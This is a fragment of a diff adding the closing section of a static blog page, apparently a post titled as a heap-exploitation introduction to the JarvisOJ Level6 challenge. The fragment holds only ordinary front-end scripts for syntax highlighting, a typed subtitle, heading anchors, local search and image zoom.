+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "堆入门-JarvisOJ-Level6&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
